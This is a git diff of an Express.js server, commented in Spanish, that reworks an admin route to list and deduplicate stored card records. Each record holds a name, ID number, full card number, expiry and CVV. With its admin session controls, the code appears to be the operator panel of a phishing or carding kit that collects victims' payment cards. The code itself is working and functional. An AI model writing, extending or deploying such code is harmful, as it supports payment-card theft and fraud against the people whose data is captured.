@@ -71,31 +71,47 @@ app.post('/admin/sesion/:sessionId/accion', (req, res) => {
     res.json({ ok: true, estado: sesion.estado });
 });
 
-// RUTA PARA EL BOTÓN DE VER TODAS LAS TARJETAS
+// RUTA DE TARJETAS CORREGIDA (SIN DUPLICADOS)
 app.get('/admin/tarjetas', (req, res) => {
-    const activas = db.sesiones.filter(s => s.datos && s.datos.tarjeta).map(s => ({
-        sessionId: s.sessionId, 
-        nombre: (s.datos.datosPersonales?.primerNombre || '') + ' ' + (s.datos.datosPersonales?.primerApellido || ''), 
-        documento: s.datos.docNumber || '-', 
-        tarjeta: s.datos.tarjeta, 
-        expMes: s.datos.expMes || '', 
-        expAnio: s.datos.expAnio || '', 
-        cvv: s.datos.cvv || '-', 
-        estado: s.estado, 
-        fecha: s.fecha
-    }));
-    const historial = db.historial.filter(s => s.datos && s.datos.tarjeta).map(s => ({
-        sessionId: s.sessionId, 
-        nombre: (s.datos.datosPersonales?.primerNombre || '') + ' ' + (s.datos.datosPersonales?.primerApellido || ''), 
-        documento: s.datos.docNumber || '-', 
-        tarjeta: s.datos.tarjeta, 
-        expMes: s.datos.expMes || '', 
-        expAnio: s.datos.expAnio || '', 
-        cvv: s.datos.cvv || '-', 
-        estado: s.estado, 
-        fecha: s.fecha
-    }));
-    const todas = [...activas, ...historial].sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
+    let mapaTarjetas = new Map();
+
+    // 1. Agregamos las de sesiones activas
+    db.sesiones.forEach(s => {
+        if (s.datos && s.datos.tarjeta) {
+            const key = s.sessionId + '_' + s.datos.tarjeta;
+            mapaTarjetas.set(key, {
+                sessionId: s.sessionId,
+                nombre: (s.datos.datosPersonales?.primerNombre || '') + ' ' + (s.datos.datosPersonales?.primerApellido || ''),
+                documento: s.datos.docNumber || '-',
+                tarjeta: s.datos.tarjeta,
+                expMes: s.datos.expMes || '',
+                expAnio: s.datos.expAnio || '',
+                cvv: s.datos.cvv || '-',
+                estado: s.estado,
+                fecha: s.fecha
+            });
+        }
+    });
+
+    // 2. Agregamos las del historial (si ya existían, se actualiza el estado final)
+    db.historial.forEach(s => {
+        if (s.datos && s.datos.tarjeta) {
+            const key = s.sessionId + '_' + s.datos.tarjeta;
+            mapaTarjetas.set(key, {
+                sessionId: s.sessionId,
+                nombre: (s.datos.datosPersonales?.primerNombre || '') + ' ' + (s.datos.datosPersonales?.primerApellido || ''),
+                documento: s.datos.docNumber || '-',
+                tarjeta: s.datos.tarjeta,
+                expMes: s.datos.expMes || '',
+                expAnio: s.datos.expAnio || '',
+                cvv: s.datos.cvv || '-',
+                estado: s.estado,
+                fecha: s.fechaCierre || s.fecha
+            });
+        }
+    });
+
+    const todas = Array.from(mapaTarjetas.values()).sort((a, b) => new Date(b.fecha) - new Date(a.fecha));
     res.json({ tarjetas: todas });
 });
 
